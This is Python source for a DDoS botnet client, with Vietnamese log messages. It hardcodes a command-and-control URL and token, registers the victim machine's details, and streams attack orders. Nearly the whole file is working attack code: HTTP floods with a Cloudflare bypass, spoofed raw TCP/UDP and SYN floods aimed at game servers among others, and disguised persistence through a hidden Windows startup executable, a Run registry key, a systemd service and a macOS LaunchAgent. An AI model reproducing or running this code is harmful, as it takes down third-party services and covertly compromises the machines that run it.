...
import os, json, sys, subprocess, shutil, platform
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from datetime import datetime

C2_URL      = "http://congenial-meme-974qvw975944fr44-1337.app.github.dev"
AUTH_TOKEN  = "daylachuoibimatrandom123456789"

HEALTH_CHECK_URL = f"{C2_URL}/ping"  

BOT_ID = f"bot_{random.randint(1, 999)}_{int(time.time() % 1000000)}"
print(f"[{time.strftime('%H:%M:%S')}] [+] Bot khởi động - ID: {BOT_ID}")
...
def rand_ua():
    ...
    return ua % random.randint(90, 123)

def CFB(url, end_time, port=80, threads=120):
    scraper = cloudscraper.create_scraper()
    def worker():
        while time.time() < end_time:
            try:
                scraper.get(f"{url}:{port}", headers={'User-Agent': rand_ua()}, timeout=5)
                scraper.head(f"{url}:{port}", headers={'User-Agent': rand_ua()}, timeout=5)
            except: pass
    for _ in range(threads):
        threading.Thread(target=worker, daemon=True).start()

def REQ_attack(url, end_time, port=80, threads=120):
    session = requests.Session()
    def worker():
        while time.time() < end_time:
            try:
                session.get(f"{url}:{port}", headers={'User-Agent': rand_ua()}, timeout=5)
                session.head(f"{url}:{port}", headers={'User-Agent': rand_ua()}, timeout=5)
            except: pass
    for _ in range(threads):
        threading.Thread(target=worker, daemon=True).start()

def attack_syn(ip, port, end_time, threads=600):
    import socket
    import threading
    import random
    import time
        ...
        while time.time() < end_time:
            try:
                ...
                if port in [25565, 19132]:  
                    handshake = bytes([
                        0x10, 0x00, 0x0d, 0x6d, 0x69, 0x6e, 0x65, 0x63, 0x72, 0x61, 0x66, 0x74,
                        0x2e, 0x6e, 0x65, 0x74, 0x07, 0x31, 0x39, 0x32, 0x2e, 0x31, 0x36, 0x38,
                        random.randint(1,255), random.randint(0,255),
                        random.randint(0,255), random.randint(1,255),
                        0x63, 0xdd, 0x01
                    ])
                    s.send(handshake)
                elif port in [30120, 30110]:  
                    s.send(b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")
                else:
                    s.send(b"GET / HTTP/1.1\r\nHost: " + ip.encode() + b"\r\nConnection: keep-alive\r\n\r\n")

                junk = random._urandom(random.randint(512, 4096))
                while time.time() < end_time:
                    try:
                        s.send(junk)
                        time.sleep(0.001)
...
def attack_tcp(ip, port, end_time, size=1024, threads=303):
    ...
    def worker():
        while time.time() < end_time:
            try:
                ...
                use_port = random.randint(1, 65535) if port in [0, "random", "RANDOM"] else int(port)

                src_ip = f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
                src_port = random.randint(1024, 65535)

                opts = bytearray([
                    0x02,0x04,0x05,0xb4, 0x01,0x03,0x03,random.randint(6,11),
                    0x01,0x01,0x08,0x0a, *[random.randint(0,255) for _ in range(8)],
                    0x04,0x02,0x22,random.choice([0x02,0x0a]), *[random.randint(0,255) for _ in range(random.randint(0,8))]
                ])
                ...
                payload = bytearray([
                    ...
                    0x63,0xdd,0x01
                ]) + random._urandom(max(0, size - len(opts) - 30))

                iph = struct.pack('!BBHHHBBH4s4s', 0x45, 0, 20+20+len(opts)+len(payload),
                                random.randint(1,65535), 0, 255, 6, 0,
                                socket.inet_aton(src_ip), socket.inet_aton(ip))

                tcph = struct.pack('!HHLLBBHHH', src_port, use_port,
                                 random.getrandbits(32), 0, 80, 0x50|0x02,
                                 random.randint(1024,65535), 0, 0)

                packet = iph + tcph + opts + payload
                iph_check = checksum(packet[:20])
                packet = packet[:16] + struct.pack('!H', iph_check) + packet[18:]

                pseudo = struct.pack('!4s4sBBH', socket.inet_aton(src_ip), socket.inet_aton(ip),
                                   0, 6, len(tcph)+len(opts)+len(payload))
                tcp_check = checksum(pseudo + tcph + opts + payload)
                packet = packet[:20+16] + struct.pack('!H', tcp_check) + packet[20+18:]

                for _ in range(random.randint(30,80)):
                    s.sendto(packet, (ip, use_port))
                s.close()
            except: pass
    ...
    def checksum(msg):
        ...
        for i in range(0, len(msg), 2):
            if i+1 < len(msg): w = (msg[i]<<8) + msg[i+1]
            else: w = msg[i]<<8
            s += w
        s = (s>>16) + (s & 0xffff)
        s = s + (s>>16)
...
def attack_oack(ip, port, end_time, threads=303):
    import socket
    import random
    import threading
    import time
    ...
    def worker():
        while time.time() < end_time:
            try:
                ...
                if port in [25565, 19132, 30120, 30110, 28015, 9987]:
                    handshake = bytes([
                        0x10, 0x00, 0x0d, 0x6d, 0x69, 0x6e, 0x65, 0x63, 0x72, 0x61, 0x66, 0x74,
                        0x2e, 0x6e, 0x65, 0x74, 0x07, 0x31, 0x39, 0x32, 0x2e, 0x31, 0x36, 0x38,
                        random.randint(1,255), random.randint(0,255),
...
def attack_udp(ip, port, end_time, size=1024, threads=303):
    import random, socket, struct, threading, time
    ...
    def worker():
        while time.time() < end_time:
            try:
                ...
                iph = struct.pack('!BBHHHBBH4s4s', 0x45, 0, 20+8+size, random.randint(1,65535), 0, 255, 17, 0,
                                socket.inet_aton(src_ip), socket.inet_aton(ip))
                udph = struct.pack('!HHHH', random.randint(1024,65535), use_port, 8+size, 0)

                payload = bytearray(size)
                for i in range(size): payload[i] = random.randint(0,255)
                if size > 20: payload[:10] = b"\xFE\xFD\x00\x00\x00\x00\x00\x00\x00\x00"
                if size > 30: payload[10:20] = b"\x00\x0F\x00\x00\x00\x00\x00\x00\x00\x00"
...
def attack_bigpacket(ip, port, end_time, size_kb=1024, threads=303):
...
def register():
    print(f"[{time.strftime('%H:%M:%S')}] [+] Đang đăng ký bot {BOT_ID}")
    info = {
    ...
    try:
        ...
        print(f"[{time.strftime('%H:%M:%S')}] [+] Public IP: {info['public_ip']}")
    except: pass
    try:
    ...
    try:
        requests.post(f"{C2_URL}/register", json={"bot_id": BOT_ID, "info": info}, 
                     headers={"X-Bot-Token": AUTH_TOKEN}, timeout=15, verify=False)
        print(f"[{time.strftime('%H:%M:%S')}] [+] Đăng ký thành công!")
    except: 
        print(f"[{time.strftime('%H:%M:%S')}] [-] Đăng ký thất bại, vẫn tiếp tục...")

def c2_health_check():
    global c2_is_alive
    headers = {
        "User-Agent": "Bot-HealthCheck",
        "X-Bot-Token": AUTH_TOKEN
    }
    while True:
        with attack_lock:
            if is_attacking:
        ...
        try:
            resp = requests.get(HEALTH_CHECK_URL, headers=headers, timeout=10, verify=False)
            if resp.status_code == 200:
                if not c2_is_alive:
                    print(f"[{time.strftime('%H:%M:%S')}] [+] C2 đã hồi sinh! Tiếp tục hoạt động...")
                c2_is_alive = True
            else:
                if c2_is_alive:
                    print(f"[{time.strftime('%H:%M:%S')}] [-] C2 trả lỗi {resp.status_code} → đánh dấu C2 chết")
                c2_is_alive = False
        except Exception as e:
            if c2_is_alive:
                print(f"[{time.strftime('%H:%M:%S')}] [-] Không kết nối được C2 → đánh dấu chết ({e})")
            c2_is_alive = False
        time.sleep(15)

def persistence():
    current_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
    print(f"[{time.strftime('%H:%M:%S')}] [+] Đang cài đặt persistence | Path: {current_path}")

    if platform.system() == "Windows":
        print(f"[{time.strftime('%H:%M:%S')}] [+] Windows → Startup + Registry")
        startup = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        target = os.path.join(startup, "WindowsService.exe")
        try:
            if not os.path.exists(target) or os.path.getsize(target) == 0:
                shutil.copy2(current_path, target)
                os.system(f'attrib +h +s "{target}" >nul 2>&1')
                print(f"[{time.strftime('%H:%M:%S')}] [+] Đã copy vào Startup (ẩn)")
        except:
            print(f"[{time.strftime('%H:%M:%S')}] [-] Copy Startup thất bại")
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "WindowsServiceHost", 0, winreg.REG_SZ, f'"{target}"')
            winreg.CloseKey(key)
            print(f"[{time.strftime('%H:%M:%S')}] [+] Đã thêm Registry Run")
        except:
            print(f"[{time.strftime('%H:%M:%S')}] [-] Thêm Registry thất bại")

    elif platform.system() == "Linux":
        print(f"[{time.strftime('%H:%M:%S')}] [+] Linux → .desktop + systemd")
        desktop_file = os.path.expanduser("~/.config/autostart/system-optimizer.desktop")
...
""")
        print(f"[{time.strftime('%H:%M:%S')}] [+] Tạo autostart .desktop OK")
        try:
            with open("/tmp/sysopt.service", "w") as f:
                f.write(f"""[Unit]
Description=System Optimizer Service
[Service]
Type=simple
ExecStart={sys.executable} "{current_path}"
Restart=always
RestartSec=10
[Install]
WantedBy=multi-user.target""")
            os.system("sudo cp /tmp/sysopt.service /etc/systemd/system/sysopt.service && sudo systemctl daemon-reload && sudo systemctl enable sysopt.service >/dev/null 2>&1")
            print(f"[{time.strftime('%H:%M:%S')}] [+] systemd service đã được cài đặt & enable")
        except:
            print(f"[{time.strftime('%H:%M:%S')}] [-] Cài systemd service thất bại (có thể không có sudo)")

    elif platform.system() == "Darwin":
        print(f"[{time.strftime('%H:%M:%S')}] [+] macOS → LaunchAgent")
...
<dict>
    ...
    <key>ProgramArguments</key><array><string>{current_path}</string></array>
    ...
    <key>KeepAlive</key><true/>
        ...
        try:
            ...
            with open(plist, "w") as f:
                f.write(content)
            print(f"[{time.strftime('%H:%M:%S')}] [+] LaunchAgent plist đã tạo thành công")
        except:
            print(f"[{time.strftime('%H:%M:%S')}] [-] Tạo LaunchAgent thất bại")
...
def connect_to_c2():
    ...
    while True:
        while not c2_is_alive:
            print(f"[{time.strftime('%H:%M:%S')}] [-] C2 đang down → chờ 10s trước khi thử lại...")
            time.sleep(10)

        try:
            print(f"[{time.strftime('%H:%M:%S')}] [+] Đang kết nối stream đến C2...")
            with requests.get(f"{C2_URL}/command/{BOT_ID}", headers=headers, stream=True, verify=False, timeout=None) as r:
                if r.status_code != 200:
                    print(f"[{time.strftime('%H:%M:%S')}] [-] Stream lỗi {r.status_code}")
                    time.sleep(5)
                    continue

                print(f"[{time.strftime('%H:%M:%S')}] [+] Kết nối stream thành công! Đang nghe lệnh...")
                buffer = b""
                        ...
                        while b"\n\n" in buffer:
                            ...
                            if line.startswith("data: "):
                                try:
                                    ...
                                    cmd = task.get("command", "").lstrip("!").upper()
                                    args = task.get("args", {})

                                    duration = max(10, int(args.get("time", 60)))
                                    end_time = time.time() + duration
                                    target = args.get("ip") or args.get("url", "unknown")

                                    # Chuẩn bị biến port/size để các lệnh đều dùng được
                                    port = int(args.get("port", 0)) if str(args.get("port", 0)) != "0" else 0
                                    size = int(args.get("size", 1024))
                                    size_kb = int(args.get("size_kb", 1024))

                                    print(f"[{time.strftime('%H:%M:%S')}] BẮT ĐẦU TẤN CÔNG → {cmd} | {duration}s → {target}")
                                    ...
                                    try:
                                        if cmd == "HTTP_CFB":
                                            CFB(args["url"], end_time)

                                        elif cmd == "HTTP_REQ":
                                            REQ_attack(args["url"], end_time)

                                        elif cmd == "UDP":
                                            attack_udp(args["ip"], end_time, port, size)

                                        elif cmd == "TCP":
                                            attack_tcp(args["ip"], port, end_time, size)

                                        elif cmd == "BIGPACKET":
                                            attack_bigpacket(args["ip"], port, end_time, size_kb)

                                        elif cmd == "SYN":
                                            attack_syn(args["ip"], port, end_time)

                                        elif cmd == "OACK":
                                            attack_oack(args["ip"], port, end_time)

                                        print(f"[{time.strftime('%H:%M:%S')}] HOÀN THÀNH TẤN CÔNG → {cmd} → {target}")
                                    ...
                                    print(f"[{time.strftime('%H:%M:%S')}] Lỗi xử lý lệnh: {e}")
                                    with attack_lock:
                                        is_attacking = False

                    if not c2_is_alive:
                        print(f"[{time.strftime('%H:%M:%S')}] [-] Health check báo C2 đã chết → ngắt stream")
                        break

        except Exception as e:
            print(f"[{time.strftime('%H:%M:%S')}] [-] Lỗi kết nối stream: {e}")
            with attack_lock:
                is_attacking = False
...
def main():
    threading.Thread(target=c2_health_check, daemon=True).start()
    time.sleep(3)
    persistence()
    register()
    connect_to_c2()
...
if __name__ == '__main__':
    try:
        ...
        print(f"\n[{time.strftime('%H:%M:%S')}] dừng bởi người dùng")
        os._exit(0)